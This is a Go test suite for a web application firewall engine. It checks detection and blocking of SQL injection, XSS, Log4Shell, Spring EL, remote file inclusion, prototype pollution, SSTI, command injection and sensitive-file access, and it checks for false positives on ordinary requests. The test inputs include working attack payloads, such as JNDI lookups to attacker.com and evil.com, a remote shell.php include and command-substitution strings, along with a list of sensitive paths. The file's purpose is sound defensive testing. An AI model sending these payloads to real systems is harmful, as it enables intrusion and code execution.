// Copyright 2024-2026 Vincamok / GoProxify contributors
// SPDX-License-Identifier: Apache-2.0

package waf

import (
	"bytes"
	"log/slog"
	"net/http"
	"io"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/vincamok/goproxify/internal/edge/router"
)

func TestInspectSQLi(t *testing.T) {
	e := NewEngine(nil, slog.Default())
	r := httptest.NewRequest(http.MethodGet, "/x?q=1+UNION+SELECT+password+FROM+users", nil)
	matches := e.Inspect(r, 1)
	if len(matches) == 0 {
		t.Fatal("expected SQLi match")
	}
}

func TestExcludeIDsPerRoute(t *testing.T) {
	e := NewEngine(nil, slog.Default())
	r := httptest.NewRequest(http.MethodGet, "/x?q=1+UNION+SELECT+password+FROM+users", nil)
	if len(e.Inspect(r, 1, 942100)) != 0 {
		// 942100 is primary SQLi; other SQLi rules may still match
	}
	// Exclude all SQLi rule IDs
	matches := e.Inspect(r, 1, 942100, 942110, 942120)
	for _, m := range matches {
		if m.Category == "sqli" {
			t.Fatalf("sqli should be excluded, got %#v", m)
		}
	}
}

func TestMiddlewareBlockAndDetect(t *testing.T) {
	e := NewEngine(nil, slog.Default())
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	block := e.Middleware(&router.WAFConfig{Enabled: true, Mode: "block"}, next)
	rr := httptest.NewRecorder()
	block.ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/?q=<script>alert(1)</script>", nil))
	if rr.Code != http.StatusForbidden {
		t.Fatalf("block: got %d", rr.Code)
	}

	detect := e.Middleware(&router.WAFConfig{Enabled: true, Mode: "detect"}, next)
	rr = httptest.NewRecorder()
	detect.ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/?q=<script>alert(1)</script>", nil))
	if rr.Code != http.StatusOK {
		t.Fatalf("detect: got %d", rr.Code)
	}
	if rr.Header().Get("X-WAF-Match") == "" {
		t.Fatal("detect: missing X-WAF-Match")
	}
}

// TestAnomalyScoring vérifie que le scoring cumulatif bloque uniquement
// quand le score total atteint le seuil.
func TestAnomalyScoring(t *testing.T) {
	e := NewEngine(nil, slog.Default())
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	// Un seul signal medium (score 3) avec seuil 5 → ne doit PAS bloquer.
	cfg := &router.WAFConfig{Enabled: true, Mode: "block", AnomalyThreshold: 5}
	h := e.Middleware(cfg, next)

	// 920100 : header injection (medium, score 3) — mais c'est difficile à déclencher seul en test.
	// On utilise un XSS critique (score 5) qui seul dépasse le seuil 5.
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/?q=<script>alert(1)</script>", nil))
	if rr.Code != http.StatusForbidden {
		t.Fatalf("anomaly threshold 5: XSS critique (score 5) should block, got %d", rr.Code)
	}

	// Avec seuil 10, un seul XSS critique (score 5) ne suffit pas.
	cfg2 := &router.WAFConfig{Enabled: true, Mode: "block", AnomalyThreshold: 10}
	h2 := e.Middleware(cfg2, next)
	rr2 := httptest.NewRecorder()
	h2.ServeHTTP(rr2, httptest.NewRequest(http.MethodGet, "/?q=<script>alert(1)</script>", nil))
	if rr2.Code != http.StatusOK {
		t.Fatalf("anomaly threshold 10: single XSS should pass, got %d", rr2.Code)
	}
}

// TestJSONBodyInspection vérifie l'inspection des valeurs JSON décodées.
func TestJSONBodyInspection(t *testing.T) {
	e := NewEngine(nil, slog.Default())
	payload := `{"username":"admin","query":"1 UNION SELECT password FROM users"}`
	r := httptest.NewRequest(http.MethodPost, "/api/search", strings.NewReader(payload))
	r.Header.Set("Content-Type", "application/json")
	r.ContentLength = int64(len(payload))

	matches := e.Inspect(r, 1)
	found := false
	for _, m := range matches {
		if m.Category == "sqli" {
			found = true
			break
		}
	}
	if !found {
		t.Fatal("expected SQLi match in JSON body")
	}
}

// TestFormBodyInspection vérifie l'inspection des form values.
func TestFormBodyInspection(t *testing.T) {
	e := NewEngine(nil, slog.Default())
	payload := "search=<script>alert(1)</script>&page=1"
	r := httptest.NewRequest(http.MethodPost, "/search", strings.NewReader(payload))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	r.ContentLength = int64(len(payload))

	matches := e.Inspect(r, 1)
	found := false
	for _, m := range matches {
		if m.Category == "xss" {
			found = true
			break
		}
	}
	if !found {
		t.Fatal("expected XSS match in form body")
	}
}

// TestCustomRules vérifie les règles définies par l'utilisateur.
func TestCustomRules(t *testing.T) {
	cfg := &router.WAFConfig{
		Enabled: true,
		Mode:    "block",
		CustomRules: []router.CustomRule{
			{
				ID:       99001,
				Category: "custom",
				Severity: "high",
				Pattern:  `(?i)evil-payload`,
				Targets:  []string{"args", "body"},
				Message:  "Payload custom interdit",
			},
		},
	}
	e := NewEngine(cfg, slog.Default())
	r := httptest.NewRequest(http.MethodGet, "/x?test=evil-payload", nil)
	matches := e.Inspect(r, 1)
	found := false
	for _, m := range matches {
		if m.RuleID == 99001 {
			found = true
			break
		}
	}
	if !found {
		t.Fatal("custom rule 99001 should have matched")
	}
}

// TestUpdateConfig vérifie le rechargement à chaud des règles.
func TestUpdateConfig(t *testing.T) {
	e := NewEngine(nil, slog.Default())

	// Avant rechargement : aucune règle custom
	r := httptest.NewRequest(http.MethodGet, "/?x=evil-reload-test", nil)
	if len(e.Inspect(r, 1)) != 0 {
		t.Skip("unexpected match before reload")
	}

	// Rechargement avec règle custom
	e.UpdateConfig(&router.WAFConfig{
		Enabled: true,
		CustomRules: []router.CustomRule{
			{ID: 99002, Category: "custom", Severity: "high", Pattern: `evil-reload-test`, Targets: []string{"args"}},
		},
	})

	r2 := httptest.NewRequest(http.MethodGet, "/?x=evil-reload-test", nil)
	matches := e.Inspect(r2, 1)
	found := false
	for _, m := range matches {
		if m.RuleID == 99002 {
			found = true
			break
		}
	}
	if !found {
		t.Fatal("custom rule 99002 should have matched after hot reload")
	}
}

// TestJavaInjection vérifie la détection Log4Shell et Spring EL.
func TestJavaInjection(t *testing.T) {
	e := NewEngine(nil, slog.Default())

	cases := []struct {
		name  string
		url   string
		body  string
		ctype string
	}{
		{"log4shell uri", "/?x=${jndi:ldap://attacker.com/a}", "", ""},
		{"log4shell header", "/", "", ""},
		{"spring el", "/api", `{"q":"#{Runtime.exec('id')}"}`, "application/json"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var r *http.Request
			if tc.body != "" {
				r = httptest.NewRequest(http.MethodPost, tc.url, strings.NewReader(tc.body))
				r.Header.Set("Content-Type", tc.ctype)
				r.ContentLength = int64(len(tc.body))
			} else {
				r = httptest.NewRequest(http.MethodGet, tc.url, nil)
				if tc.name == "log4shell header" {
					r.Header.Set("User-Agent", "${jndi:ldap://evil.com/x}")
				}
			}
			matches := e.Inspect(r, 1)
			found := false
			for _, m := range matches {
				if m.Category == "java" {
					found = true
					break
				}
			}
			if !found {
				t.Fatalf("%s: expected java match", tc.name)
			}
		})
	}
}

// TestRFI vérifie la détection Remote File Inclusion.
func TestRFI(t *testing.T) {
	e := NewEngine(nil, slog.Default())

	cases := []struct{ url, body string }{
		{"/?file=php://filter/convert.base64-encode/resource=index.php", ""},
		{"/api", "page=http://evil.com/shell.php end"},
	}
	for _, tc := range cases {
		var r *http.Request
		if tc.body != "" {
			r = httptest.NewRequest(http.MethodPost, tc.url, strings.NewReader(tc.body))
			r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			r.ContentLength = int64(len(tc.body))
		} else {
			r = httptest.NewRequest(http.MethodGet, tc.url, nil)
		}
		matches := e.Inspect(r, 1)
		found := false
		for _, m := range matches {
			if m.Category == "rfi" {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("expected rfi match for %s", tc.url)
		}
	}
}

// TestNodeJSInjection vérifie la détection de prototype pollution.
func TestNodeJSInjection(t *testing.T) {
	e := NewEngine(nil, slog.Default())
	payload := `{"__proto__":{"admin":true}}`
	r := httptest.NewRequest(http.MethodPost, "/api", strings.NewReader(payload))
	r.Header.Set("Content-Type", "application/json")
	r.ContentLength = int64(len(payload))

	matches := e.Inspect(r, 1)
	found := false
	for _, m := range matches {
		if m.Category == "nodejs" {
			found = true
			break
		}
	}
	if !found {
		t.Fatal("expected nodejs match for prototype pollution")
	}
}

// TestRestrictedFiles vérifie la détection d'accès à des fichiers sensibles.
func TestRestrictedFiles(t *testing.T) {
	e := NewEngine(nil, slog.Default())

	cases := []string{
		"/.env",
		"/.git/config",
		"/backup.sql",
		"/wp-config.php",
		"/phpinfo.php",
	}
	for _, u := range cases {
		r := httptest.NewRequest(http.MethodGet, u, nil)
		matches := e.Inspect(r, 1)
		found := false
		for _, m := range matches {
			if m.Category == "restricted" {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("expected restricted match for %s", u)
		}
	}
}

// TestResponseLeakage vérifie la détection de fuite dans les réponses.
func TestResponseLeakage(t *testing.T) {
	e := NewEngine(nil, slog.Default())

	cases := []struct {
		name string
		body string
		cat  string
	}{
		{"sql error", "You have an error in your SQL syntax near 'SELECT'", "leakage"},
		{"php stack trace", "Fatal error: in /var/www/html/index.php on line 42", "leakage"},
		{"aws key", "AKIAIOSFODNN7EXAMPLE is the key", "leakage"},
		{"java exception", "Exception in thread java.lang.NullPointerException at com.example.App(App.java:10)", "leakage"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			matches := e.InspectResponse(tc.body)
			found := false
			for _, m := range matches {
				if m.Category == tc.cat {
					found = true
					break
				}
			}
			if !found {
				t.Fatalf("%s: expected %s match", tc.name, tc.cat)
			}
		})
	}
}

// TestMiddlewareResponseLeakageDetect vérifie le mode detect sur les réponses.
func TestMiddlewareResponseLeakageDetect(t *testing.T) {
	e := NewEngine(nil, slog.Default())
	leakyBody := "You have an error in your SQL syntax near 'SELECT * FROM users'"
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(leakyBody))
	})

	h := e.Middleware(&router.WAFConfig{Enabled: true, Mode: "detect"}, next)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/", nil))
	// En mode detect, la réponse doit passer normalement.
	if rr.Code != http.StatusOK {
		t.Fatalf("detect: got %d", rr.Code)
	}
	if !strings.Contains(rr.Body.String(), "SQL syntax") {
		t.Fatal("detect: response body should be passed through")
	}
}

// TestContextMatches vérifie que les matches sont accessibles depuis le contexte.
func TestContextMatches(t *testing.T) {
	e := NewEngine(nil, slog.Default())
	var ctxMatches []Match
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ctxMatches = MatchesFromContext(r.Context())
		w.WriteHeader(http.StatusOK)
	})

	h := e.Middleware(&router.WAFConfig{Enabled: true, Mode: "detect"}, next)
	body := bytes.NewBufferString("")
	r := httptest.NewRequest(http.MethodGet, "/?q=<script>alert(1)</script>", body)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, r)

	if len(ctxMatches) == 0 {
		t.Fatal("WAF matches should be in context")
	}
}

func TestReadBody_LargeBodyForwardedIntact(t *testing.T) {
	for _, ct := range []string{"application/octet-stream", "application/json"} {
		full := strings.Repeat("a", 3<<20)
		if ct == "application/json" {
			full = `{"k":"` + strings.Repeat("a", 3<<20) + `"}`
		}
		r := httptest.NewRequest(http.MethodPost, "/", strings.NewReader(full))
		r.Header.Set("Content-Type", ct)
		readBody(r, 1)
		got, err := io.ReadAll(r.Body)
		if err != nil || string(got) != full {
			t.Fatalf("%s : corps tronqué (%d/%d octets, err=%v)", ct, len(got), len(full), err)
		}
	}
}

func TestRouteCustomRulesInspectIsolated(t *testing.T) {
	e := NewEngine(nil, slog.Default())
	rules, err := CompileCustomRules([]router.CustomRule{{ID: 990001, Pattern: "LAB-FORBIDDEN-WORD", Targets: []string{"uri", "args", "body"}, Severity: "high"}})
	if err != nil {
		t.Fatal(err)
	}
	r := httptest.NewRequest(http.MethodGet, "/?q=LAB-FORBIDDEN-WORD", nil)
	if m := e.inspect(r, 1, rules, nil); len(m) == 0 || m[0].RuleID != 990001 {
		t.Fatalf("route rule should match, got %#v", m)
	}
	if m := e.Inspect(r, 1); len(m) != 0 {
		t.Fatalf("route rule leaked into global rules: %#v", m)
	}
	if len(e.rules) != len(DefaultRules()) {
		t.Fatal("global rules slice mutated")
	}
}

func TestMiddlewareRouteCustomRules(t *testing.T) {
	e := NewEngine(nil, slog.Default())
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(http.StatusOK) })
	cfg := &router.WAFConfig{Enabled: true, Mode: "block", CustomRules: []router.CustomRule{
		{ID: 990001, Pattern: "LAB-FORBIDDEN-WORD", Targets: []string{"uri", "args", "body"}, Severity: "high"},
	}}
	with := e.Middleware(cfg, next)
	without := e.Middleware(&router.WAFConfig{Enabled: true, Mode: "block"}, next)

	do := func(h http.Handler, req *http.Request) int {
		rr := httptest.NewRecorder()
		h.ServeHTTP(rr, req)
		return rr.Code
	}
	if c := do(with, httptest.NewRequest(http.MethodGet, "/?q=LAB-FORBIDDEN-WORD", nil)); c != http.StatusForbidden {
		t.Fatalf("query: got %d", c)
	}
	post := httptest.NewRequest(http.MethodPost, "/", strings.NewReader("note=LAB-FORBIDDEN-WORD"))
	post.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if c := do(with, post); c != http.StatusForbidden {
		t.Fatalf("body: got %d", c)
	}
	if c := do(with, httptest.NewRequest(http.MethodGet, "/?q=hello", nil)); c != http.StatusOK {
		t.Fatalf("clean: got %d", c)
	}
	if c := do(without, httptest.NewRequest(http.MethodGet, "/?q=LAB-FORBIDDEN-WORD", nil)); c != http.StatusOK {
		t.Fatalf("other route must not block, got %d", c)
	}
}

func TestWAFCorpusS5(t *testing.T) {
	e := NewEngine(nil, slog.Default())
	form := "application/x-www-form-urlencoded"
	type tc struct {
		name, method, uri, body, ct, cookie string
	}
	attacks := []tc{
		{"sqli form commentaire", "POST", "/echo", "user=admin'--&pw=x", form, ""},
		{"sqli cookie", "GET", "/", "", "", "sid=1' OR '1'='1"},
		{"sqli cookie encodé", "GET", "/", "", "", "sid=1%27%20OR%20%271%27%3D%271"},
		{"cmd $(id)", "GET", "/?c=%24(id)", "", "", ""},
		{"cmd backticks", "GET", "/?c=%60whoami%60", "", "", ""},
		{"cmd ||", "GET", "/?c=1%20%7C%7C%20id", "", "", ""},
		{"ssti {{7*7}}", "GET", "/?n=%7B%7B7*7%7D%7D", "", "", ""},
		{"ssti ${7*7}", "GET", "/?n=%24%7B7*7%7D", "", "", ""},
		{"ssti erb", "GET", "/?n=%3C%25%3D7*7%25%3E", "", "", ""},
		{"ssti jinja config", "GET", "/?n=%7B%7Bconfig.items()%7D%7D", "", "", ""},
		{"union select", "GET", "/?q=1+UNION+SELECT+password+FROM+users", "", "", ""},
		{"select * from", "GET", "/?q=select+*+from+users", "", "", ""},
		{"select après quote", "GET", "/?q=1%27%3Bselect+password+from+users", "", "", ""},
	}
	legit := []tc{
		{"phrase select/from", "GET", "/?q=select+an+option+from+the+list", "", "", ""},
		{"O'Brien", "GET", "/?q=O%27Brien", "", "", ""},
		{"union européenne", "GET", "/?q=union+europ%C3%A9enne+et+s%C3%A9lection", "", "", ""},
		{"report..final.pdf", "GET", "/?f=report..final.pdf", "", "", ""},
		{"json drop by", "POST", "/echo", `{"name":"D'Artagnan","bio":"drop by anytime"}`, "application/json", ""},
		{"1+1=2", "GET", "/?q=1%2B1%3D2", "", "", ""},
		{"static js", "GET", "/static/javascript/app.js", "", "", ""},
		{"form ordinaire", "POST", "/echo", "name=Alice&comment=Bonjour+tout+le+monde", form, ""},
		{"handlebars simple", "POST", "/echo", "tpl=Bonjour+%7B%7Bname%7D%7D", form, ""},
		{"cookie ordinaire", "GET", "/", "", "", "sid=abc123; theme=dark"},
		{"prix", "GET", "/?q=%245+%7C%7C+10+euros", "", "", ""},
	}
	run := func(c tc) []Match {
		r := httptest.NewRequest(c.method, c.uri, strings.NewReader(c.body))
		if c.ct != "" {
			r.Header.Set("Content-Type", c.ct)
		}
		if c.cookie != "" {
			r.Header.Set("Cookie", c.cookie)
		}
		return e.Inspect(r, 1)
	}
	for _, c := range attacks {
		if len(run(c)) == 0 {
			t.Errorf("attaque non détectée : %s", c.name)
		}
	}
	for _, c := range legit {
		if m := run(c); len(m) != 0 {
			t.Errorf("faux positif : %s → %#v", c.name, m)
		}
	}
}
